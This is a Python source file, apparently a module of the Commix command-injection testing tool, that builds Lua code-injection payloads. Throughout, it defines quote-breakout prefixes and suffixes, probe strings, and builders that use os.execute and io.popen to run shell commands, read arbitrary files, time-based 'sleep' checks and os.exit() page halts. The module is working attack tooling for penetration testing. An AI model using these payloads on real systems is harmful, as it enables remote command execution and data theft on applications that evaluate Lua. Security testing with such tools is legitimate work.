#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

NAME = "lua"

# The same name as it is written out to the user, where the switch's own spelling would read wrong.
LABEL = "Lua"

# A constant whose value says at once that code was evaluated, and which build evaluated it.
PROBE = "_VERSION"

# The probe on its own - already a string, so nothing here needs to coerce it into one.
PROBE_FUNCTIONS = ["" + PROBE + ""]

# The same probe broken into the string being evaluated, one boundary per row.
PROBE_PAYLOADS = [
  [x for x in PROBE_FUNCTIONS],
  [".." + x for x in PROBE_FUNCTIONS],
  ["'.." + x + "..'" for x in PROBE_FUNCTIONS],
  ["\".." + x + "..\"" for x in PROBE_FUNCTIONS],
  ["')  .." + x + "..('" for x in PROBE_FUNCTIONS]
]

PROBE_PAYLOADS = [x for payload in PROBE_PAYLOADS for x in payload]

# What the probe's own value looks like coming back, and the complaints that say a payload reached
# an evaluated string even where nothing was rendered.
PROBE_REGEX = r"Lua (\d+\.\d+)"
WARNINGS = ["unexpected symbol", "attempt to call", "attempt to index", "')' expected", "[string \""]

"""
The language's own functions that run a command, widest first as the level rises.

Each is written out whole, its module included - this language has no bare name for either, the way
one without them built in would need written out again here.
"""
EXECUTION_FUNCTIONS_LVL1 = ["os.execute"]
EXECUTION_FUNCTIONS_LVL2 = EXECUTION_FUNCTIONS_LVL1 + ["io.popen"]
EXECUTION_FUNCTIONS_LVL3 = EXECUTION_FUNCTIONS_LVL2

# Breaking out of the evaluated string, and closing it again behind the payload.
SEPARATORS_LVL1 = [""]
SEPARATORS_LVL2 = SEPARATORS_LVL1 + ["\n"]
SEPARATORS_LVL3 = SEPARATORS_LVL2 + ["\r\n"]

# The whole value as the expression, concatenation onto a value that is already one (with '..',
# this language's own concatenation operator), and concatenation out of a quoted string the value
# sits inside - either quote reads the same here, neither one interpolating what it holds.
PREFIXES_LVL1 = ["", "..", "'..", "\".."]
PREFIXES_LVL2 = PREFIXES_LVL1 + ["')..", "\")..", "',", "\","]
PREFIXES_LVL3 = PREFIXES_LVL2 + ["';", "\";", ";", ")", "']", "\"]", "'}", "\"}"]

SUFFIXES_LVL1 = ["", "..'", "..\""]
# Closing the call again, and commenting out whatever the application appends behind it.
SUFFIXES_LVL2 = SUFFIXES_LVL1 + ["..('", "..(\"", "--"]
SUFFIXES_LVL3 = SUFFIXES_LVL2 + ["'--", "\"--", ")--", "]--", "}--", ",'", ",\""]

# How one of the functions above is reached, as a prefix a payload is wrapped in.
def execution_prefix(function):
  return function + "("

"""
Wrap the shell commands a payload runs in what this language renders them with.

There is no statement here that writes to the response the way another language's print does: what
the application renders is the value of the expression it evaluated, so the commands' output is
concatenated and handed back as that value.
"""
def print_statement(separator, commands, chain=None):
  if separator == "":
    return "..".join(run(command) for command in commands)
  return run((chain or separator).join(commands))

"""
The expressions every payload is built out of, spelled the way this language spells them.
"""

# A string literal holding the given text. Lua strings read exactly what is between their quotes -
# nothing in one is ever read back as a variable or another expression - so only a literal
# backslash and the quote closing this one need escaping, nothing an embedded '$' or '@' needs.
def _literal(text):
  return "\"" + text.replace("\\", "\\\\").replace("\"", "\\\"") + "\""

# Run a command and yield its output, through the one handle this language reads a command's
# stdout from.
def run(cmd):
  return "io.popen(" + _literal(cmd) + "):read(\"*a\")"

# Read a file and yield its contents.
def read_file(path):
  return "io.open(" + _literal(path) + "):read(\"*a\")"

"""
Drop trailing whitespace, so a length agrees with what a shell's own substitution would report.

Parenthesised around the whole call: 'gsub' answers the string and how many times it matched, and
the second of those would otherwise still be there wherever this sits as the last of several
arguments passed to something else - 'string.len', not least.
"""
def trim(expr):
  return "((" + expr + "):gsub(\"%s+$\", \"\"))"

# How many bytes an expression is.
def length(expr):
  return "#(" + expr + ")"

"""
The ordinal of an expression's Nth byte, counting from zero.

'string.byte' itself counts from one, so the index asked for here is one more than it would be
anywhere else in this grammar - answering nothing, not a byte that happens to share a value, where
the index runs past the end.
"""
def ordinal(expr, index):
  return "(" + expr + "):byte(" + str(index + 1) + ") or 0"

# An expression's value read as a number, for a command whose output is one.
def to_number(expr):
  return "(tonumber(" + expr + ") or 0)"

"""
Wait for as long as the condition is true, and no time at all when it is false.

Both sides of this language's own stand-in for a ternary have to answer something true-like of
their own, or the 'or' beside it would run anyway - 'sleep N' always does, so there is nothing here
the empty string this grammar's halt() answers would have needed a second guard against.
"""
def delay(timesec, condition):
  return "os.execute((" + condition + ") and \"sleep " + str(timesec) + "\" or \"true\")"

"""
Stop the page where the condition does not hold, so what comes back says which it was.
"""
def halt(condition):
  # Empty string rather than a number: the value is spliced into whatever the target was building,
  # and only a string leaves that expression intact for the page to render as it normally would.
  # The empty string answering true here is no different from any other string to this language's
  # own 'and'/'or' - unlike some, it never reads one as the false this grammar does not mean.
  # Wrapped whole: '..' binds tighter than 'and'/'or' here, so the payload's own concatenation onto
  # this would otherwise reach straight through 'or' into one side of it alone.
  return "((" + condition + ") and \"\" or os.exit())"

"""
Evaluate one expression and then another, within a single expression.

'select(2, ...)' returns everything from its second argument on - both are still evaluated to get
there, so the first one's side effect still runs, but only the second is what the whole thing reads
as. The comma operator another grammar reaches for here has no equivalent of its own in this one.
"""
def sequence(first, second):
  return "(select(2," + first + "," + second + "))"

# The shell's comparison operators, as this language spells them.
COMPARISON = {"-le": "<=", "-ge": ">=", "-lt": "<", "-gt": ">", "-eq": "==", "-ne": "~="}

# What ends a statement, where the boundary being tested can carry one.
TERMINATOR = ";"

# eof
